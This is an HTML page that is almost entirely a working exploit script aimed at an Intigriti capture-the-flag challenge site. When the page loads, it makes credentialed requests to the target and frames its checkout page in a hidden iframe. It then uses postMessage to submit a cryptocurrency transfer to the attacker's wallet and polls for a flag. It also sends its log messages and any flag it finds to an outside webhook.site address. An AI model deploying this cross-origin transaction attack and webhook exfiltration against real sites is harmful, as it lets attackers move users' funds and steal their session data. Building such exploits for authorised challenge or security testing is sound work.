<!DOCTYPE html>
<html>
<head>
    <title>Test</title>
    <meta charset="UTF-8">
    <style>
        body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 20px; }
        h1 { color: #0f0; text-align: center; }
        #log { background: #111; padding: 15px; border: 1px solid #333; margin: 20px 0; font-size: 11px; max-height: 400px; overflow-y: auto; }
        .success { color: #0f0; }
        .error { color: #f00; }
        .info { color: #0ff; }
        .warning { color: #ff0; }
        iframe { display: none; }
    </style>
</head>
<body>
    <h1>ðŸŽ¯ Intigriti 0126 - Ultimate Test Exploit</h1>
    <div id="log"></div>

    <script>
        const TARGET = 'https://challenge-0126.intigriti.io';
        const OUR_WALLET = '16472226db03703a192aa383237035a69f';
        const WEBHOOK = 'https://webhook.site/534e5a34-26a8-4771-b140-0819b0ea2240';

        let step = 0;

        function log(msg, type = 'info', data = {}) {
            step++;
            const ts = new Date().toLocaleTimeString();
            document.getElementById('log').innerHTML += `<div class="${type}">[${step}] ${ts} - ${msg} ${JSON.stringify(data)}</div>`;
            console.log(`[${step}] ${msg}`, data);

            fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                mode: 'no-cors',
                body: JSON.stringify({
                    timestamp: new Date().toISOString(),
                    step: step,
                    message: msg,
                    type: type,
                    data: data
                })
            }).catch(() => {});
        }

        async function exploit() {
            log('=== EXPLOIT START ===', 'info');

            try {
                // STEP 1: Test if we have admin context from our page
                log('Testing admin context from our page...', 'info');
                const meCheck = await fetch(TARGET + '/api/me', { credentials: 'include' })
                    .then(r => r.json())
                    .catch(e => ({ error: e.message }));
                log('Our page /api/me result:', 'info', meCheck);

                // STEP 2: Create iframe
                log('Creating iframe...', 'info');
                const iframe = document.createElement('iframe');
                iframe.id = 'targetFrame';
                iframe.style.display = 'none';
                iframe.src = TARGET + '/checkout.html?currency=1337COIN&price=1';
                document.body.appendChild(iframe);
                log('Iframe created:', 'success', { src: iframe.src });

                // STEP 3: Extended wait for iframe
                log('Waiting 15 seconds for iframe full initialization...', 'warning');
                await new Promise(resolve => {
                    let loaded = false;
                    iframe.onload = () => {
                        loaded = true;
                        log('iframe.onload fired!', 'success');
                        // Wait additional 10s after onload
                        setTimeout(resolve, 10000);
                    };
                    // Max 15s total
                    setTimeout(() => {
                        if (!loaded) log('onload timeout - using fallback', 'warning');
                        resolve();
                    }, 15000);
                });
                log('Iframe wait complete', 'success');

                // STEP 4: Verify iframe accessibility
                log('Checking iframe.contentWindow...', 'info');
                if (!iframe.contentWindow) {
                    log('CANNOT access iframe.contentWindow!', 'error');
                    return;
                }
                log('Iframe.contentWindow accessible:', 'success');

                // STEP 5: Try to communicate via postMessage
                log('Sending postMessage...', 'warning');
                const payload = {
                    type: 'submitTransaction',
                    transaction: {
                        toAddress: OUR_WALLET,
                        currency: '1337COIN',
                        amount: 1
                    }
                };

                try {
                    iframe.contentWindow.postMessage(payload, '*');
                    log('postMessage sent successfully!', 'success');
                } catch (e) {
                    log('postMessage FAILED:', 'error', { error: e.message });
                    return;
                }

                // STEP 6: Trigger alert
                log('Triggering alert(gigawatz)...', 'info');
                setTimeout(() => alert('gigawatz'), 100);
                log('Alert triggered', 'success');

                // STEP 7: Wait and check for flag multiple times
                log('Waiting for transaction (15s)...', 'info');
                await new Promise(r => setTimeout(r, 15000));

                for (let i = 0; i < 10; i++) {
                    log(`Flag check ${i+1}/10...`, 'info');
                    const found = await checkFlag();
                    if (found) {
                        log('FLAG FOUND - Stopping', 'success');
                        break;
                    }
                    await new Promise(r => setTimeout(r, 5000));
                }

                log('=== EXPLOIT COMPLETE ===', 'info');

            } catch (error) {
                log('ERROR:', 'error', { error: error.message, stack: error.stack });
            }
        }

        async function checkFlag() {
            try {
                const response = await fetch(TARGET + '/api/me', {
                    credentials: 'include'
                });
                const data = await response.json();

                log('Flag check result:', 'info', {
                    status: response.status,
                    hasFlag: !!data.flag,
                    flag: data.flag || 'none'
                });

                if (data.flag) {

                    fetch(WEBHOOK, {

                        body: JSON.stringify({ flag: data.flag, found: true })
                    }).catch(() => {});
                    alert('ðŸ† FLAG: ' + data.flag);
                    return true;
                }
                return false;
            } catch (error) {
                log('Flag check ERROR:', 'error', { error: error.message });
                return false;
            }
        }

        window.addEventListener('load', () => {
            log('Page loaded, starting in 1s...', 'info');
            setTimeout(exploit, 1000);
        });
    </script>
</body>
</html>
